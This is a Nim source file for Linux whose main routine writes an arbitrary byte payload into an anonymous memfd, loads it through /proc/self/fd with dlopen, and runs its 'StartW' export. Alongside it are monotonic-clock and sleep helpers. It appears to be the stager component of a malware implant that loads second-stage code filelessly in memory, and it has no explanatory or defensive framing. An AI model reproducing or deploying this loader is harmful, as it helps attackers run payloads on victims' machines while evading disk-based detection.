from posix import Timespec, Time, CLOCK_MONOTONIC, Off, clock_gettime, nanosleep

{.emit: "#define _GNU_SOURCE\n".}

const
  memFdCloexec* = 1
  rtLdNow* = 2
  stageExportName* = "StartW"

proc memfd_create(name: cstring, flags: cuint): cint {.importc, header: "sys/mman.h".}
proc dlopen(name: cstring, flag: cint): pointer {.importc, header: "dlfcn.h".}
proc dlsym(handle: pointer, symbol: cstring): pointer {.importc, header: "dlfcn.h".}
proc dlclose(handle: pointer): cint {.importc, header: "dlfcn.h".}
proc write(fd: cint, buf: pointer, len: csize_t): cint {.importc, header: "unistd.h".}
proc close(fd: cint): cint {.importc, header: "unistd.h".}
proc snprintf(buf: pointer, size: csize_t, format: cstring): cint {.importc, header: "stdio.h", varargs.}

proc getTickCount*(): culong =
  # Reads the monotonic clock and returns elapsed milliseconds
  var ts: Timespec
  if clock_gettime(CLOCK_MONOTONIC, ts) != 0:
    return 0
  culong(ts.tv_sec.uint64 * 1000 + ts.tv_nsec.uint64 div 1_000_000)

proc sleepMs*(ms: culong) =
  # Receives a millisecond count and sleeps for that long
  if ms == 0:
    return
  var req: Timespec
  req.tv_sec = Time((ms div 1000).int64)
  req.tv_nsec = (ms mod 1000).int64 * 1_000_000
  var rem: Timespec
  discard nanosleep(req, rem)

proc loadSharedLibrary*(payload: openArray[byte]): bool =
  # Writes the payload to a memory file, loads the library, and calls the stage entry
  if payload.len == 0:
    return false

  let fd = memfd_create("", memFdCloexec.cuint)
  if fd < 0:
    return false

  var off = 0
  while off < payload.len:
    let n = write(fd, cast[pointer](unsafeAddr payload[off]), (payload.len - off).csize_t)
    if n <= 0:
      discard close(fd)
      return false
    off += int(n)

  var path: array[64, char]
  if snprintf(addr path[0], path.len.csize_t, "/proc/self/fd/%d", fd) < 0:
    discard close(fd)
    return false

  let handle = dlopen(addr path[0], rtLdNow)
  if handle == nil:
    discard close(fd)
    return false

  let sym = dlsym(handle, stageExportName)
  if sym == nil:
    discard dlclose(handle)
    discard close(fd)
    return false

  type StageFn = proc() {.cdecl.}
  cast[StageFn](sym)()
  discard dlclose(handle)
  discard close(fd)
  true
